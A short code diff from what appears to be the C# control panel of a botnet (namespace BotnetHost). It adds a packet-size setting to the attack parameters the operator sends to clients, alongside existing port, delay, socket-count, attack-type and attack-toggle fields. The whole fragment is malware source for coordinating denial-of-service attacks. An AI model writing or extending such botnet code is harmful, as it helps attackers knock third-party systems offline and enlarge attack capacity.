@@ -323,6 +323,7 @@ namespace BotnetHost
                 clientConnection.port = int.Parse(metroTextBox2.Text);
                 clientConnection.delay = delayTrackBar.Value;
                 clientConnection.sockets = socketsTrackBar.Value;
+                clientConnection.packetSize = packetSizeTrackBar.Value;
                 clientConnection.attack = attackingToggle.Checked;
                 if (attackTypeComboBox.Text == "")
                 {
@@ -349,6 +350,7 @@ namespace BotnetHost
         {
             delayLabel.Text = delayTrackBar.Value.ToString();
             socketsLabel.Text = socketsTrackBar.Value.ToString();
+            packetSizeLabel.Text = packetSizeTrackBar.Value.ToString();
         }
 
         /// <summary>
